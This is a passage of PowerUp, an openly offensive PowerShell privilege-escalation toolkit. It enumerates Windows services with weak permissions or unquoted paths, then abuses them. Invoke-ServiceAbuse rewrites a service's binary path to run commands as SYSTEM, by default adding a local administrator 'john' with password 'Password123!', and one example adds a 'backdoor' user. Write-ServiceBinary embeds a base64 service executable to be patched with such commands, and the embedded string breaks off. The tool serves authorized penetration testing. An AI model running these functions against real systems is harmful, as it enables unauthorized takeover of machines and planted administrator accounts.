            'Start'                 = [uint32]'0x00000010'
            'Stop'                  = [uint32]'0x00000020'
            'PauseContinue'         = [uint32]'0x00000040'
            'Interrogate'           = [uint32]'0x00000080'
            'UserDefinedControl'    = [uint32]'0x00000100'
            'Delete'                = [uint32]'0x00010000'
            'ReadControl'           = [uint32]'0x00020000'
            'WriteDac'              = [uint32]'0x00040000'
            'WriteOwner'            = [uint32]'0x00080000'
            'Synchronize'           = [uint32]'0x00100000'
            'AccessSystemSecurity'  = [uint32]'0x01000000'
            'GenericAll'            = [uint32]'0x10000000'
            'GenericExecute'        = [uint32]'0x20000000'
            'GenericWrite'          = [uint32]'0x40000000'
            'GenericRead'           = [uint32]'0x80000000'
            'AllAccess'             = [uint32]'0x000F01FF'
        }

        $CheckAllPermissionsInSet = $False

        if ($PSBoundParameters['Permissions']) {
            $TargetPermissions = $Permissions
        }
        else {
            if ($PermissionSet -eq 'ChangeConfig') {
                $TargetPermissions = @('ChangeConfig', 'WriteDac', 'WriteOwner', 'GenericAll', ' GenericWrite', 'AllAccess')
            }
            elseif ($PermissionSet -eq 'Restart') {
                $TargetPermissions = @('Start', 'Stop')
                $CheckAllPermissionsInSet = $True # so we check all permissions && style
            }
            elseif ($PermissionSet -eq 'AllAccess') {
                $TargetPermissions = @('GenericAll', 'AllAccess')
            }
        }
    }

    PROCESS {

        ForEach($IndividualService in $Name) {

            $TargetService = $IndividualService | Add-ServiceDacl

            if ($TargetService -and $TargetService.Dacl) {

                # enumerate all group SIDs the current user is a part of
                $UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
                $CurrentUserSids = $UserIdentity.Groups | Select-Object -ExpandProperty Value
                $CurrentUserSids += $UserIdentity.User.Value

                ForEach($ServiceDacl in $TargetService.Dacl) {
                    if ($CurrentUserSids -contains $ServiceDacl.SecurityIdentifier) {

                        if ($CheckAllPermissionsInSet) {
                            $AllMatched = $True
                            ForEach($TargetPermission in $TargetPermissions) {
                                # check permissions && style
                                if (($ServiceDacl.AccessRights -band $AccessMask[$TargetPermission]) -ne $AccessMask[$TargetPermission]) {
                                    # Write-Verbose "Current user doesn't have '$TargetPermission' for $($TargetService.Name)"
                                    $AllMatched = $False
                                    break
                                }
                            }
                            if ($AllMatched) {
                                $TargetService
                            }
                        }
                        else {
                            ForEach($TargetPermission in $TargetPermissions) {
                                # check permissions || style
                                if (($ServiceDacl.AceType -eq 'AccessAllowed') -and ($ServiceDacl.AccessRights -band $AccessMask[$TargetPermission]) -eq $AccessMask[$TargetPermission]) {
                                    Write-Verbose "Current user has '$TargetPermission' for $IndividualService"
                                    $TargetService
                                    break
                                }
                            }
                        }
                    }
                }
            }
            else {
                Write-Verbose "Error enumerating the Dacl for service $IndividualService"
            }
        }
    }
}


########################################################
#
# Service enumeration
#
########################################################

function Get-UnquotedService {
<#
.SYNOPSIS

Returns the name and binary path for services with unquoted paths
that also have a space in the name.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-ModifiablePath, Test-ServiceDaclPermission  

.DESCRIPTION

Uses Get-WmiObject to query all win32_service objects and extract out
the binary pathname for each. Then checks if any binary paths have a space
and aren't quoted.

.EXAMPLE

Get-UnquotedService

Get a set of potentially exploitable services.

.OUTPUTS

PowerUp.UnquotedService

.LINK

https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/trusted_service_path.rb
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.UnquotedService')]
    [CmdletBinding()]
    Param()

    # find all paths to service .exe's that have a space in the path and aren't quoted
    $VulnServices = Get-WmiObject -Class win32_service | Where-Object {
        $_ -and ($Null -ne $_.pathname) -and ($_.pathname.Trim() -ne '') -and (-not $_.pathname.StartsWith("`"")) -and (-not $_.pathname.StartsWith("'")) -and ($_.pathname.Substring(0, $_.pathname.ToLower().IndexOf('.exe') + 4)) -match '.* .*'
    }

    if ($VulnServices) {
        ForEach ($Service in $VulnServices) {

            $SplitPathArray = $Service.pathname.Split(' ')
            $ConcatPathArray = @()
            for ($i=0;$i -lt $SplitPathArray.Count; $i++) {
                        $ConcatPathArray += $SplitPathArray[0..$i] -join ' '
            }

            $ModifiableFiles = $ConcatPathArray | Get-ModifiablePath

            $ModifiableFiles | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | Foreach-Object {
                $CanRestart = Test-ServiceDaclPermission -PermissionSet 'Restart' -Name $Service.name
                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'ServiceName' $Service.name
                $Out | Add-Member Noteproperty 'Path' $Service.pathname
                $Out | Add-Member Noteproperty 'ModifiablePath' $_
                $Out | Add-Member Noteproperty 'StartName' $Service.startname
                $Out | Add-Member Noteproperty 'AbuseFunction' "Write-ServiceBinary -Name '$($Service.name)' -Path <HijackPath>"
                $Out | Add-Member Noteproperty 'CanRestart' ([Bool]$CanRestart)
                $Out | Add-Member Aliasproperty Name ServiceName
                $Out.PSObject.TypeNames.Insert(0, 'PowerUp.UnquotedService')
                $Out
            }
        }
    }
}


function Get-ModifiableServiceFile {
<#
.SYNOPSIS

Enumerates all services and returns vulnerable service files.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Test-ServiceDaclPermission, Get-ModifiablePath  

.DESCRIPTION

Enumerates all services by querying the WMI win32_service class. For each service,
it takes the pathname (aka binPath) and passes it to Get-ModifiablePath to determine
if the current user has rights to modify the service binary itself or any associated
arguments. If the associated binary (or any configuration files) can be overwritten,
privileges may be able to be escalated.

.EXAMPLE

Get-ModifiableServiceFile

Get a set of potentially exploitable service binares/config files.

.OUTPUTS

PowerUp.ModifiablePath
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.ModifiableServiceFile')]
    [CmdletBinding()]
    Param()

    Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pathname} | ForEach-Object {

        $ServiceName = $_.name
        $ServicePath = $_.pathname
        $ServiceStartName = $_.startname

        $ServicePath | Get-ModifiablePath | ForEach-Object {
            $CanRestart = Test-ServiceDaclPermission -PermissionSet 'Restart' -Name $ServiceName
            $Out = New-Object PSObject
            $Out | Add-Member Noteproperty 'ServiceName' $ServiceName
            $Out | Add-Member Noteproperty 'Path' $ServicePath
            $Out | Add-Member Noteproperty 'ModifiableFile' $_.ModifiablePath
            $Out | Add-Member Noteproperty 'ModifiableFilePermissions' $_.Permissions
            $Out | Add-Member Noteproperty 'ModifiableFileIdentityReference' $_.IdentityReference
            $Out | Add-Member Noteproperty 'StartName' $ServiceStartName
            $Out | Add-Member Noteproperty 'AbuseFunction' "Install-ServiceBinary -Name '$ServiceName'"
            $Out | Add-Member Noteproperty 'CanRestart' ([Bool]$CanRestart)
            $Out | Add-Member Aliasproperty Name ServiceName
            $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiableServiceFile')
            $Out
        }
    }
}


function Get-ModifiableService {
<#
.SYNOPSIS

Enumerates all services and returns services for which the current user can modify the binPath.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Test-ServiceDaclPermission, Get-ServiceDetail  

.DESCRIPTION

Enumerates all services using Get-Service and uses Test-ServiceDaclPermission to test if
the current user has rights to change the service configuration.

.EXAMPLE

Get-ModifiableService

Get a set of potentially exploitable services.

.OUTPUTS

PowerUp.ModifiablePath
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.ModifiableService')]
    [CmdletBinding()]
    Param()

    Get-Service | Test-ServiceDaclPermission -PermissionSet 'ChangeConfig' | ForEach-Object {
        $ServiceDetails = $_ | Get-ServiceDetail
        $CanRestart = $_ | Test-ServiceDaclPermission -PermissionSet 'Restart'
        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'ServiceName' $ServiceDetails.name
        $Out | Add-Member Noteproperty 'Path' $ServiceDetails.pathname
        $Out | Add-Member Noteproperty 'StartName' $ServiceDetails.startname
        $Out | Add-Member Noteproperty 'AbuseFunction' "Invoke-ServiceAbuse -Name '$($ServiceDetails.name)'"
        $Out | Add-Member Noteproperty 'CanRestart' ([Bool]$CanRestart)
        $Out | Add-Member Aliasproperty Name ServiceName
        $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiableService')
        $Out
    }
}


function Get-ServiceDetail {
<#
.SYNOPSIS

Returns detailed information about a specified service by querying the
WMI win32_service class for the specified service name.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Takes an array of one or more service Names or ServiceProcess.ServiceController objedts on
the pipeline object returned by Get-Service, extracts out the service name, queries the
WMI win32_service class for the specified service for details like binPath, and outputs
everything.

.PARAMETER Name

An array of one or more service names to query information for.

.EXAMPLE

Get-ServiceDetail -Name VulnSVC

Gets detailed information about the 'VulnSVC' service.

.EXAMPLE

Get-Service VulnSVC | Get-ServiceDetail

Gets detailed information about the 'VulnSVC' service.

.OUTPUTS

System.Management.ManagementObject
#>

    [OutputType('PowerUp.ModifiableService')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ServiceName')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $Name
    )

    PROCESS {
        ForEach($IndividualService in $Name) {
            $TargetService = Get-Service -Name $IndividualService -ErrorAction Stop
            if ($TargetService) {
                Get-WmiObject -Class win32_service -Filter "Name='$($TargetService.Name)'" | Where-Object {$_} | ForEach-Object {
                    try {
                        $_
                    }
                    catch {
                        Write-Verbose "Error: $_"
                    }
                }
            }
        }
    }
}


########################################################
#
# Service abuse
#
########################################################

function Invoke-ServiceAbuse {
<#
.SYNOPSIS

Abuses a function the current user has configuration rights on in order
to add a local administrator or execute a custom command.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-ServiceDetail, Set-ServiceBinaryPath  

.DESCRIPTION

Takes a service Name or a ServiceProcess.ServiceController on the pipeline that the current
user has configuration modification rights on and executes a series of automated actions to
execute commands as SYSTEM. First, the service is enabled if it was set as disabled and the
original service binary path and configuration state are preserved. Then the service is stopped
and the Set-ServiceBinaryPath function is used to set the binary (binPath) for the service to a
series of commands, the service is started, stopped, and the next command is configured. After
completion, the original service configuration is restored and a custom object is returned
that captures the service abused and commands run.

.PARAMETER Name

An array of one or more service names to abuse.

.PARAMETER UserName

The [domain\]username to add. If not given, it defaults to "john".
Domain users are not created, only added to the specified localgroup.

.PARAMETER Password

The password to set for the added user. If not given, it defaults to "Password123!"

.PARAMETER LocalGroup

Local group name to add the user to (default of 'Administrators').

.PARAMETER Credential

A [Management.Automation.PSCredential] object specifying the user/password to add.

.PARAMETER Command

Custom command to execute instead of user creation.

.PARAMETER Force

Switch. Force service stopping, even if other services are dependent.

.EXAMPLE

Invoke-ServiceAbuse -Name VulnSVC

Abuses service 'VulnSVC' to add a localuser "john" with password
"Password123! to the  machine and local administrator group

.EXAMPLE

Get-Service VulnSVC | Invoke-ServiceAbuse

Abuses service 'VulnSVC' to add a localuser "john" with password
"Password123! to the  machine and local administrator group

.EXAMPLE

Invoke-ServiceAbuse -Name VulnSVC -UserName "TESTLAB\john"

Abuses service 'VulnSVC' to add a the domain user TESTLAB\john to the
local adminisrtators group.

.EXAMPLE

Invoke-ServiceAbuse -Name VulnSVC -UserName backdoor -Password password -LocalGroup "Power Users"

Abuses service 'VulnSVC' to add a localuser "backdoor" with password
"password" to the  machine and local "Power Users" group

.EXAMPLE

Invoke-ServiceAbuse -Name VulnSVC -Command "net ..."

Abuses service 'VulnSVC' to execute a custom command.

.OUTPUTS

PowerUp.AbusedService
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingUserNameAndPassWordParams', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerUp.AbusedService')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ServiceName')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $Name,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserName = 'john',

        [ValidateNotNullOrEmpty()]
        [String]
        $Password = 'Password123!',

        [ValidateNotNullOrEmpty()]
        [String]
        $LocalGroup = 'Administrators',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [String]
        [ValidateNotNullOrEmpty()]
        $Command,

        [Switch]
        $Force
    )

    BEGIN {

        if ($PSBoundParameters['Command']) {
            $ServiceCommands = @($Command)
        }

        else {
            if ($PSBoundParameters['Credential']) {
                $UserNameToAdd = $Credential.UserName
                $PasswordToAdd = $Credential.GetNetworkCredential().Password
            }
            else {
                $UserNameToAdd = $UserName
                $PasswordToAdd = $Password
            }

            if ($UserNameToAdd.Contains('\')) {
                # only adding a domain user to the local group, no user creation
                $ServiceCommands = @("net localgroup $LocalGroup $UserNameToAdd /add")
            }
            else {
                # create a local user and add it to the local specified group
                $ServiceCommands = @("net user $UserNameToAdd $PasswordToAdd /add", "net localgroup $LocalGroup $UserNameToAdd /add")
            }
        }
    }

    PROCESS {

        ForEach($IndividualService in $Name) {

            $TargetService = Get-Service -Name $IndividualService -ErrorAction Stop
            $ServiceDetails = $TargetService | Get-ServiceDetail

            $RestoreDisabled = $False
            if ($ServiceDetails.StartMode -match 'Disabled') {
                Write-Verbose "Service '$(ServiceDetails.Name)' disabled, enabling..."
                $TargetService | Set-Service -StartupType Manual -ErrorAction Stop
                $RestoreDisabled = $True
            }

            $OriginalServicePath = $ServiceDetails.PathName
            $OriginalServiceState = $ServiceDetails.State

            Write-Verbose "Service '$($TargetService.Name)' original path: '$OriginalServicePath'"
            Write-Verbose "Service '$($TargetService.Name)' original state: '$OriginalServiceState'"

            ForEach($ServiceCommand in $ServiceCommands) {

                if ($PSBoundParameters['Force']) {
                    $TargetService | Stop-Service -Force -ErrorAction Stop
                }
                else {
                    $TargetService | Stop-Service -ErrorAction Stop
                }

                Write-Verbose "Executing command '$ServiceCommand'"
                $Success = $TargetService | Set-ServiceBinaryPath -Path "$ServiceCommand"

                if (-not $Success) {
                    throw "Error reconfiguring the binary path for $($TargetService.Name)"
                }

                $TargetService | Start-Service -ErrorAction SilentlyContinue
                Start-Sleep -Seconds 2
            }

            if ($PSBoundParameters['Force']) {
                $TargetService | Stop-Service -Force -ErrorAction Stop
            }
            else {
                $TargetService | Stop-Service -ErrorAction Stop
            }

            Write-Verbose "Restoring original path to service '$($TargetService.Name)'"
            Start-Sleep -Seconds 1
            $Success = $TargetService | Set-ServiceBinaryPath -Path "$OriginalServicePath"

            if (-not $Success) {
                throw "Error restoring the original binPath for $($TargetService.Name)"
            }

            # try to restore the service to whatever the service's original state was
            if ($RestoreDisabled) {
                Write-Verbose "Re-disabling service '$($TargetService.Name)'"
                $TargetService | Set-Service -StartupType Disabled -ErrorAction Stop
            }
            elseif ($OriginalServiceState -eq "Paused") {
                Write-Verbose "Starting and then pausing service '$($TargetService.Name)'"
                $TargetService | Start-Service
                Start-Sleep -Seconds 1
                $TargetService | Set-Service -Status Paused -ErrorAction Stop
            }
            elseif ($OriginalServiceState -eq "Stopped") {
                Write-Verbose "Leaving service '$($TargetService.Name)' in stopped state"
            }
            else {
                Write-Verbose "Restarting '$($TargetService.Name)'"
                $TargetService | Start-Service
            }

            $Out = New-Object PSObject
            $Out | Add-Member Noteproperty 'ServiceAbused' $TargetService.Name
            $Out | Add-Member Noteproperty 'Command' $($ServiceCommands -join ' && ')
            $Out.PSObject.TypeNames.Insert(0, 'PowerUp.AbusedService')
            $Out
        }
    }
}


function Write-ServiceBinary {
<#
.SYNOPSIS

Patches in the specified command to a pre-compiled C# service executable and
writes the binary out to the specified ServicePath location.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Takes a pre-compiled C# service binary and patches in the appropriate commands needed
for service abuse. If a -UserName/-Password or -Credential is specified, the command
patched in creates a local user and adds them to the specified -LocalGroup, otherwise
the specified -Command is patched in. The binary is then written out to the specified
-ServicePath. Either -Name must be specified for the service, or a proper object from
Get-Service must be passed on the pipeline in order to patch in the appropriate service
name the binary will be running under.

.PARAMETER Name

The service name the EXE will be running under.

.PARAMETER UserName

The [domain\]username to add. If not given, it defaults to "john".
Domain users are not created, only added to the specified localgroup.

.PARAMETER Password

The password to set for the added user. If not given, it defaults to "Password123!"

.PARAMETER LocalGroup

Local group name to add the user to (default of 'Administrators').

.PARAMETER Credential

A [Management.Automation.PSCredential] object specifying the user/password to add.

.PARAMETER Command

Custom command to execute instead of user creation.

.PARAMETER Path

Path to write the binary out to, defaults to 'service.exe' in the local directory.

.EXAMPLE

Write-ServiceBinary -Name VulnSVC

Writes a service binary to service.exe in the local directory for VulnSVC that
adds a local Administrator (john/Password123!).

.EXAMPLE

Get-Service VulnSVC | Write-ServiceBinary

Writes a service binary to service.exe in the local directory for VulnSVC that
adds a local Administrator (john/Password123!).

.EXAMPLE

Write-ServiceBinary -Name VulnSVC -UserName 'TESTLAB\john'

Writes a service binary to service.exe in the local directory for VulnSVC that adds
TESTLAB\john to the Administrators local group.

.EXAMPLE

Write-ServiceBinary -Name VulnSVC -UserName backdoor -Password Password123!

Writes a service binary to service.exe in the local directory for VulnSVC that
adds a local Administrator (backdoor/Password123!).

.EXAMPLE

Write-ServiceBinary -Name VulnSVC -Command "net ..."

Writes a service binary to service.exe in the local directory for VulnSVC that
executes a custom command.

.OUTPUTS

PowerUp.ServiceBinary
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingUserNameAndPassWordParams', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerUp.ServiceBinary')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ServiceName')]
        [String]
        [ValidateNotNullOrEmpty()]
        $Name,

        [String]
        $UserName = 'john',

        [String]
        $Password = 'Password123!',

        [String]
        $LocalGroup = 'Administrators',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [String]
        [ValidateNotNullOrEmpty()]
        $Command,

        [String]
        $Path = "$(Convert-Path .)\service.exe"
    )

    BEGIN {
        # the raw unpatched service binary
        $B64Binary = "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UmVmbGVjdGlvbgBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAQXNzZW1ibHlDdWx0dXJlQXR0cmlidXRlAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBDb21WaXNpYmxlQXR0cmlidXRlAEd1aWRBdHRyaWJ1dGUAQXNzZW1ibHlWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAU3lzdGVtLlJ1bnRpbWUuVmVyc2lvbmluZwBUYXJnZXRGcmFtZXdvcmtBdHRyaWJ1dGUAU3lzdGVtLkRpYWdub3N0aWNzAERlYnVnZ2FibGVBdHRyaWJ1dGUARGVidWdnaW5nTW9kZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAElEaXNwb3NhYmxlAENvbnRhaW5lcgBTdHJpbmcAVHJpbQBzZXRfU2VydmljZU5hbWUAUHJvY2VzcwBTdGFydABTeXN0ZW0uVGhyZWFkaW5nAFRocmVhZABTbGVlcABFbnZpcm9ubWVudABFeGl0AFJ1bgAARUEAQQBBACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAAL/3LwBDACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAI